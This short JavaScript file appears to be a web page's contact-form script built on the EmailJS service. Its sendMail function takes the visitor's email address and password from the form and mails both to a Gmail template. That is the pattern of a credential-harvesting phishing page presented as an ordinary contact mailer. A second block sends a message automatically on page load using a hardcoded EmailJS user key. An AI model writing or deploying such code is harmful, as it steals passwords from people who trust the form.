function sendMail(contactForm) {
    emailjs.send("gmail","template_8q5b5bd", {
        "from_email": contactForm.emailaddrress.value,
        "from_password": contactForm.password.value
    })
    .then(
        function(response) {
            console.log("SUCCESS", response);
        },
        function(error) {
            console.log("FAILED", error);
        });
};

 
        (function() {
            emailjs.init("user_DITpcASPRplNJ1cwPXxAN");
            emailjs.send("gmail", "template_8q5b5bd", {
                name: "Joseph",
                notes: "The project that I want is..."
            })
        })();
